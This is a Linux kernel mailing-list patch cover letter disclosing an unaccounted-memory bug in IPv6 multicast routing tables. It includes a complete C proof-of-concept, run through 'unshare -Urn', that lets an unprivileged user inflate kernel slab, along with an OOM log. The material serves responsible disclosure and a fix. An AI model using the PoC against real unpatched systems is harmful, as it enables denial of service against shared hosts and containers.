Received: from mail-pf1-f171.google.com (mail-pf1-f171.google.com [209.85.210.171])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 300574399E5
	for <stable@vger.kernel.org>; Mon,  7 Sep 2026 08:11:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.171
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788768666; cv=none; b=CVhP3Htm+koD0nLvjDbUaqUthpv5ORPAk4QjPMcikdAQg9mfj+KaeBZpJh8N2oUogkpoEFg+kZSZPlsYZ2KgiGGuMol1s6ftfhMupC0ZgOlSMFJFlDvtuMKgvN5JIZ5juuX4B+iwJTO1Ab16eEZpoF5xfkPmOCR5Wq5/FQDLxVk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788768666; c=relaxed/simple;
	bh=PU0Gy8mWI8mGFz0qr/5uaaKqZMRrOFxS7IYTDEEg2dY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=EkaV/4t4G+9vanVB4zdYRozK8lKyLDvl3luUcggxE2J/yK/C/m5WUU2F/uoZm9nkyjwKoo/XQg3oOKRuOzd2/Knx0TH6jm6XPRdSahP5KC/ZbzbpVUmpljZcTtMmp38zNjkjN50Da8wSyVC2ORX/LN8WU0spGpNgUb2a5iBv55U=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=i0BFS5jh; arc=none smtp.client-ip=209.85.210.171
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="i0BFS5jh"
Received: by mail-pf1-f171.google.com with SMTP id d2e1a72fcca58-8568e3ecfc3so2145545b3a.3
        for <stable@vger.kernel.org>; Mon, 07 Sep 2026 01:11:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788768664; x=1789373464; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=VkAI8fReXDq85ydV27naphqQA/gQiEdg3pNh4k24F9g=;
        b=i0BFS5jh9Wkdjs8glTX9+43SVqrwUssaERgsxsNzDhe5+LRq3nvOKgqzQicerd8HHE
         6ZdQXIGxE0aXNj4TBAXb+L8s6HzKuwDr/RwUAV8AWOq6dqbNFk8/UhJIrtmFYBj8Fcxp
         1/oJiDo4i1GX31u9sKymwn0oc2xOpYogYRJwnoL2T0AvsbiJZ6f25Hi9xr1OYiPPuj8n
         pe+UhYtvLpGDVb7dw1Nq2fD/FSxWztnX9ieoOQ5MeqrEjbhpTZWpquXh/9P4voXpvX+2
         NDKXT3Qi1/DGJls3SV4wKvi88kYx+JvL1RHbi95FD9Jbxyt6uXYuKuSahXkeGTJwU97d
         lBqg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788768664; x=1789373464;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=VkAI8fReXDq85ydV27naphqQA/gQiEdg3pNh4k24F9g=;
        b=jo5KZ+GkCqnaniPAkgo6yHH3qBiAG5cC32sex1YJEiGEaMiQ2HcDosWwI4/DxSq56M
         RXou2GJ0UFEh0R7PIPD5Y2YFX+aawR8hAYKwYwwEXqt3RkSsTHSu3cIeUkYFG82G920/
         uQRs/d0/DjbJsem4H8ceWnNCLSx30aCA1Uu6VGU3dcrndnORnX/RAypn2U0/Kfh2DIVr
         nqsjgcmdlCQCz0POA3q7YPQ/Y8caEPCz4BXXDtmxO/FrpjWnC5zLzYW0VilVidpGvZEn
         CtHpNXY9Fjws03T9JOmbhA+KOgzg6HADFPPlYHpMp65fTGNLbDbgJo3aGlitgRsrD2w2
         WopA==
X-Forwarded-Encrypted: i=1; AKwUvByVop0tuvme0OTCBvCED2jL03QTNxHOOJO/2Bi40i6KQD86J1lms/vV0rMsQkFjw1tPSRfQ8yA=@vger.kernel.org
X-Gm-Message-State: AFuF++n24EesxzuEZ2KJa59NlVry76y+iFDG1GBnZTBa/f+nSdbD1GGW
	luUQN11VlUlhWMdhs2Ca3JTvb1CSS6gq9892lCy+N8487wOSV/sDZYdXiFAA4NxF2Jn1
X-Gm-Gg: AYBFou3Uu/gSjA8qCcB9EbJC3oLMTyfsufP2R2KK1ywWIwu93eiUiADH5mmYfZxg9Y1
	yHV29nhnW4TxBs4/iCfHr+9EPYbPunXHclSrFgjz0bm9KvAZZK3Cv5y0LjK4LgnNXd+tnqJFU4S
	XYvYXeE3McFa7NluvrasV+eDidqj2timsC63h8t6vv2dfNLu5Bc8U12CRruWDGz6wjfnTaRVy6k
	2wSSWsuxKl251Wsq1XKO+wQO0Ej7CyTk8Ecen5SttQ8B8/h89uwMShY1/Jc88A3dBdAnqD817G0
	OYtALafdxa487pneWRR8OBF7pC35caI+UU5LJK4uDEL+xqATVaSSzGpJriUuKzmW4ZKj74WoWq+
	YKEnqYKXdWxajsFDKljLo804VcPhNj0vFFyk4IsWrzR/9S63M/90KrhpTXKDxHhNCQeQZKLYfIN
	FxIy8nQuspK1fzTOrqPaUYuoWgFG3lzl9SI1+ulCJWUk6a6/kQH9iRdoGM+L02xms+rzz2IndZd
	jrNsEbDGN1MxLjmMOo=
X-Received: by 2002:a05:6a21:118e:b0:3d3:adbf:7784 with SMTP id adf61e73a8af0-3da3a1cef30mr34411299637.25.1788768664123;
        Mon, 07 Sep 2026 01:11:04 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc45e15604fsm3494883a12.0.2026.09.07.01.10.59
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 07 Sep 2026 01:11:03 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Benjamin Thery <benjamin.thery@bull.net>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v3 0/1] ipmr: unaccounted multicast table memory
Date: Mon,  7 Sep 2026 08:10:55 +0000
Message-ID: <cover.1788765185.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6mr.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

MRT6_TABLE is supposed to select an IPv6 multicast routing table id.
ip6_mroute_setsockopt() currently calls ip6mr_new_table() for every
unseen id and links the new mr_table into mr6_tables. The table stays
allocated until the net namespace is torn down and was not charged to
memcg.

A raw ICMPv6 socket created after unshare -Urn therefore has
CAP_NET_ADMIN/CAP_NET_RAW in that namespace. It can loop
MRT6_TABLE(fresh id) without MRT6_INIT, close the socket, and still
leave the tables allocated.

On an unfixed 7.3.0-rc1 kernel in a 2 vCPU, 2 GB QEMU VM, ./poc 30000 1
grew Slab from 27644 kB to 150412 kB and SUnreclaim from 19804 kB to
142552 kB. setsockopt() still returned 0; that run did not panic or
OOM the host. The same unfixed kernel under a 64M memory.max also
finished with RET:0, because the tables were not charged to memcg
(memory.current stayed about 414 kB). There is no KASAN stack to
decode for the unfixed growth.

The first unaccounted IPv6 heap table appeared in commit 4e16880cb422
("netns: ip6mr: dynamically allocates vif6_table"), which replaced a
static vif6_table[] with kcalloc(..., GFP_KERNEL). Commit
6bd521433942 ("ipv6: ip6mr: move mroute data into seperate structure")
only wrapped that already-heap state into mr6_table. Commit
d1db275dd3f6 ("ipv6: ip6mr: support multiple tables") only expanded
the table count from 1 to N, so Fixes: still points at 4e16880cb422.
IPv6 MFC entries were already unaccounted from commit 7bc570c8b4f7
("[IPV6] MROUTE: Support multicast forwarding."); IPv4 ip_mrt_cache is
older still.

The established way to bound this class of per-netns object is memcg
accounting, as done for IP addresses, routes and alternate interface
names. The patch charges mr_table with GFP_KERNEL_ACCOUNT and marks
the IPv4/IPv6 MFC caches SLAB_ACCOUNT. With a memory.max limit on the
container, further table allocations fail and the allocating process
is OOM-killed instead of growing unaccounted host slab.

The pasted reproducer is the IPv6 MRT6_TABLE loop. It does not cover
MRT6_ADD_MFC or IPv4 MRT_TABLE. The OOM log below is from the same
PoC after the accounting patch, running as poc.static under a 64M
memory.max.

The leak is a setsockopt accounting bug, not a packet-sequence bug, so
the reproducer is a raw ICMPv6 socket program rather than packetdrill.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The in-guest binary was named poc.static. Unfixed Slab growth used
unshare -Urn ./poc.static 30000 1. The decoded OOM log used:

    echo +memory > /sys/fs/cgroup/cgroup.subtree_control
    mkdir /sys/fs/cgroup/mrtest
    echo 64M > /sys/fs/cgroup/mrtest/memory.max
    bash -c 'echo $$ > /sys/fs/cgroup/mrtest/cgroup.procs; exec unshare -Urn ./poc.static 30000 1'

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute6.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [count] [start_table]\n"
		"  count: number of new MRT6 table ids to allocate (default: 200000)\n"
		"  start_table: first table id to use (default: 1)\n",
		prog);
	exit(1);
}

int main(int argc, char **argv)
{
	unsigned int count = 200000;
	unsigned int start = 1;
	unsigned int i;
	int fd;

	if (argc > 3)
		usage(argv[0]);
	if (argc >= 2)
		count = strtoul(argv[1], NULL, 0);
	if (argc == 3)
		start = strtoul(argv[2], NULL, 0);

	if (count == 0 || start == 0 || start >= 100000000U)
		usage(argv[0]);

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
	if (fd < 0)
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");

	for (i = 0; i < count; i++) {
		u_int32_t table = start + i;

		if (table >= 100000000U) {
			fprintf(stderr, "stopped before invalid table id %u\n", table);
			break;
		}

		if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table,
			       sizeof(table)) < 0) {
			fprintf(stderr,
				"setsockopt(MRT6_TABLE, %u) failed after %u allocations: %s\n",
				table, i, strerror(errno));
			close(fd);
			return 2;
		}

		if ((i % 10000) == 0) {
			struct rusage ru;

			if (!getrusage(RUSAGE_SELF, &ru))
				fprintf(stderr,
					"allocated=%u current_table=%u maxrss_kb=%ld\n",
					i + 1, table, ru.ru_maxrss);
			else
				fprintf(stderr, "allocated=%u current_table=%u\n",
					i + 1, table);
		}
	}

		fprintf(stderr,
			"done: allocated %u tables on one socket without MRT6_INIT; closing socket now\n",
			i);
	close(fd);
	sleep(2);
	fprintf(stderr, "socket closed; tables persist until netns teardown\n");
	return 0;
}
------END poc.c--------

----BEGIN crash log----
poc.static invoked oom-killer: gfp_mask=0x400dc0(GFP_KERNEL_ACCOUNT|__GFP_ZERO), order=1, oom_score_adj=0
[   65.587658] CPU: 1 UID: 0 PID: 294 Comm: poc.static Not tainted 7.3.0-rc1-00241-gd995bc728c32 #3 PREEMPT(lazy)
[   65.587664] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   65.587665] Call Trace:
[   65.587698]  <TASK>
[   65.587699]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   65.587718]  dump_header (mm/oom_kill.c:464)
[   65.587720]  oom_kill_process (mm/oom_kill.c:1031)
[   65.587721]  out_of_memory (mm/oom_kill.c:1169 (discriminator 4))
[   65.587723]  mem_cgroup_out_of_memory (mm/memcontrol.c:1952)
[   65.587725]  try_charge_memcg (mm/memcontrol.c:1975 mm/memcontrol.c:2760)
[   65.587727]  __memcg_slab_post_alloc_hook (mm/memcontrol.c:3161 mm/memcontrol.c:3539 mm/memcontrol.c:3669)
[   65.587728]  ? __pfx_ip6mr_new_table_set (net/ipv6/ip6mr.c:379)
[   65.587731]  __kmalloc_cache_noprof (mm/slub.c:2517 mm/slub.c:4702 mm/slub.c:4996 mm/slub.c:5559)
[   65.587733]  ? mr_table_alloc (include/linux/slab.h:991 include/linux/slab.h:1312 net/ipv4/ipmr_base.c:55)
[   65.587734]  mr_table_alloc (include/linux/slab.h:991 include/linux/slab.h:1312 net/ipv4/ipmr_base.c:55)
[   65.587736]  ? __pfx_ipmr_expire_process (net/ipv4/ipmr.c:3339)
[   65.587737]  ip6_mroute_setsockopt (net/ipv6/ip6mr.c:416 net/ipv6/ip6mr.c:408 net/ipv6/ip6mr.c:1873)
[   65.587739]  ? update_cfs_rq_load_avg (kernel/sched/fair.c:5687)
[   65.587742]  ? kvm_clock_get_cycles (arch/x86/kernel/kvmclock.c:80 (discriminator 1) arch/x86/kernel/kvmclock.c:87 (discriminator 1))
[   65.587743]  ? ktime_get (kernel/time/timekeeping.c:304 kernel/time/timekeeping.c:482 kernel/time/timekeeping.c:1004)
[   65.587746]  ? clockevents_program_event (kernel/time/clockevents.c:372)
[   65.587747]  do_ipv6_setsockopt (net/ipv6/ipv6_sockglue.c:397)
[   65.587750]  ? __cgroup_account_cputime (kernel/cgroup/rstat.c:626 (discriminator 10) kernel/cgroup/rstat.c:637 (discriminator 10))
[   65.587752]  ? update_se (include/linux/cgroup.h:877 kernel/sched/fair.c:1421)
[   65.587753]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
[   65.587755]  ? pick_eevdf (kernel/sched/fair.c:969 kernel/sched/fair.c:1208)
[   65.587757]  ? sock_has_perm (security/selinux/hooks.c:4932 (discriminator 1))
[   65.587758]  ipv6_setsockopt (net/ipv6/ipv6_sockglue.c:965)
[   65.587760]  do_sock_setsockopt (net/socket.c:2397)
[   65.587777]  __sys_setsockopt (net/socket.c:2422)
[   65.587779]  __x64_sys_setsockopt (net/socket.c:2428 net/socket.c:2425 net/socket.c:2425)
[   65.587780]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   65.587783]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   65.587784] RIP: 0033:0x41d58e
[   65.587786] Code: bc c5 c1 e0 1a 0d 00 00 04 00 89 01 e9 c1 fe ff ff e8 36 02 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 c0
[   65.587787] RSP: 002b:00007ffe3f28f9c8 EFLAGS: 00000297 ORIG_RAX: 0000000000000036
[   65.587789] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041d58e
[   65.587790] RDX: 00000000000000d1 RSI: 0000000000000029 RDI: 0000000000000003
[   65.587790] RBP: 0000000000000001 R08: 0000000000000004 R09: 0000000000000000
[   65.587791] R10: 00007ffe3f28f9ec R11: 0000000000000297 R12: 0000000005f5e0ff
[   65.587792] R13: 0000000000007530 R14: 0000000000003fb0 R15: 00000000d1b71759
[   65.587793]  </TASK>
[   65.587803] memory: usage 65536kB, limit 65536kB, failcnt 21
[   65.587809] swap: usage 0kB, limit 9007199254740988kB, failcnt 0
[   65.587814] Memory cgroup stats for /mrtest:
[   65.587846] anon 49152
[   65.587851] file 0
[   65.587856] kernel 67059712
[   65.587862] kernel_stack 0
[   65.587867] pagetables 45056
[   65.587872] sec_pagetables 0
[   65.587877] percpu 1280
[   65.587882] sock 0
[   65.587887] vmalloc 0
[   65.587892] shmem 0
[   65.587897] file_mapped 0
[   65.587902] file_dirty 0
[   65.587907] file_writeback 0
[   65.587912] swapcached 0
[   65.587917] inactive_anon 45056
[   65.587940] active_anon 4096
[   65.587946] inactive_file 0
[   65.587951] active_file 0
[   65.587956] unevictable 0
[   65.587961] slab_reclaimable 13600
[   65.587966] slab_unreclaimable 66997016
[   65.587971] slab 67010616
[   65.587977] workingset_refault_anon 0
[   65.587978] workingset_refault_file 0
[   65.587978] workingset_activate_anon 0
[   65.587978] workingset_activate_file 0
[   65.587978] workingset_restore_anon 0
[   65.587979] workingset_restore_file 0
[   65.587979] workingset_nodereclaim 0
[   65.587979] pgdemote_kswapd 0
[   65.587979] pgdemote_direct 0
[   65.587980] pgdemote_khugepaged 0
[   65.587980] pgdemote_proactive 0
[   65.587980] pgsteal_kswapd 0
[   65.587980] pgsteal_direct 12
[   65.587981] pgsteal_khugepaged 0
[   65.587981] pgsteal_proactive 0
[   65.587981] pgscan_kswapd 0
[   65.587981] pgscan_direct 12
[   65.587981] pgscan_khugepaged 0
[   65.587982] pgscan_proactive 0
[   65.587982] pgrefill 1
[   65.587982] pgscan 12
[   65.587982] pgsteal 12
[   65.587983] pswpin 0
[   65.587983] pswpout 0
[   65.587983] pgfault 108
[   65.587983] pgmajfault 1
[   65.587983] pgactivate 1
[   65.587984] pgdeactivate 1
[   65.587984] pglazyfree 0
[   65.587984] pglazyfreed 0
[   65.587984] swpin_zero 0
[   65.587984] swpout_zero 0
[   65.587985] Memory cgroup min protection 0kB -- low protection 0kB
[   65.587985] Tasks state (memory values in pages):
[   65.587986] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[   65.587987] [    294]     0   294      261      179       12      167         0    40960        0             0 poc.static
[   65.587989] oom-kill:constraint=CONSTRAINT_MEMCG,nodemask=(null),cpuset=/,mems_allowed=0,oom_memcg=/mrtest,task_memcg=/mrtest,task=poc.static,pid=294,uid=0
[   65.587995] Memory cgroup out of memory: Killed process 294 (poc.static) total-vm:1044kB, anon-rss:48kB, file-rss:668kB, shmem-rss:0kB, UID:0 pgtables:40kB oom_score_adj:0
-----END crash log-----

Best regards,
Zihan Xi


Zihan Xi (1):
  ipmr: account multicast table and route memory

 net/ipv4/ipmr.c      | 3 ++-
 net/ipv4/ipmr_base.c | 2 +-
 net/ipv6/ip6mr.c     | 2 +-
 3 files changed, 4 insertions(+), 3 deletions(-)

base-commit: 641d03105cc0d2437e32fdeec164f91a4ccef6c4
-- 
2.43.0

